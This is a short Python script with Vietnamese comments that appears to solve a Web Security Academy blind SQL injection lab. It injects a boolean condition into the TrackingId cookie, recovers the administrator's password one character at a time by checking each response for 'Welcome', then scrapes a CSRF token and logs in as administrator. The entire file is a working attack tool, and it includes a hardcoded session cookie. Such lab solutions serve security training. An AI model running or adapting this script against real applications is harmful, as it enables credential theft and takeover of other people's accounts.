import requests
from bs4 import BeautifulSoup

url = input("Nhập URL (https://xxxxx.web-security-academy.net): ").strip().rstrip("/")

# Bước 1: Lấy TrackingId
r = requests.get(url)
cookies_header = r.headers.get('Set-Cookie', '')
tracking_id = next((p.split('=')[1] for p in cookies_header.split(';') if p.strip().startswith('TrackingId=')), None)

if not tracking_id:
    print("Không tìm thấy TrackingId.")
    exit()

print(f"TrackingId: {tracking_id}")

# Bước 2: Tấn công Blind SQLi
charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
passw = ''

for index in range(1, 21):
    for c in charset:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')='{c}"
        cookies = {"TrackingId": payload, "session": "70ipyj4mj7XlFojaO9xMj1cbpoiewWAu"}
        print(f"Thử ký tự {index}: {c}", end="\r")
        r2 = requests.get(url, cookies=cookies)
        if "Welcome" in r2.text:
            passw += c
            print(f"\n>> Tìm được: {passw}")
            break
    else:
        print("\nKhông tìm được ký tự tiếp theo.")
        break

print(f"\nMật khẩu tìm được: {passw}")

# Bước 3: Đăng nhập
login_url = f"{url}/login"
s = requests.Session()
r = s.get(login_url)

if r.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {r.status_code}")
    exit()

csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "csrf"})["value"]
data = {"csrf": csrf, "username": "administrator", "password": passw}
r = s.post(login_url, data=data)

print("✅ Đăng nhập thành công!" if "Welcome" in r.text else "❌ Đăng nhập thất bại.")
